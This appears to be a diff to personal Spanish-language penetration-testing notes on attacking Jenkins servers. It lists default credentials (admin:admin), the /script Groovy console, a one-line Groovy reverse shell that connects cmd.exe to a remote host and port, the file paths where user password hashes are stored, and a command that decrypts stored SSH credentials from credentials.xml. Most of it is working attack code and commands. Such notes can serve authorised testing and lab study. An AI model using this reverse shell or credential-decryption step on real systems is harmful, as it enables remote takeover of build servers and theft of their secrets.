@@ -6,6 +6,10 @@ admin:admin
 #Default usr:pwd en Jenkins. Por default se usa la db de Jenkins y no permite el registro de usuarios.
 configureSecurity
 #Donde se almacenan y se ven las configuraciones de seguridad.
+/var/jenkins_home/users/users.xml
+#Este archivo nos da los nombres de las carpetas donde se almacena la passwd encriptada del usuario
+/var/jenkins_home/users/<folder>/config.xml
+#Aca es donde se guarda la passwd encriptada
 
 	## Attacking Jenkins
 /script
@@ -31,3 +35,6 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 #Reverse shell oara Jenkins en windows
 
+	## Decrypt SSH key
+println(hudson.util.Secret.decrypt("<String>"))
+#En el caso de que haya un plugin para conectarse mediante ssh, se puede usar la consola en /script pegando el string en /var/jenkins_home/credentials.xml
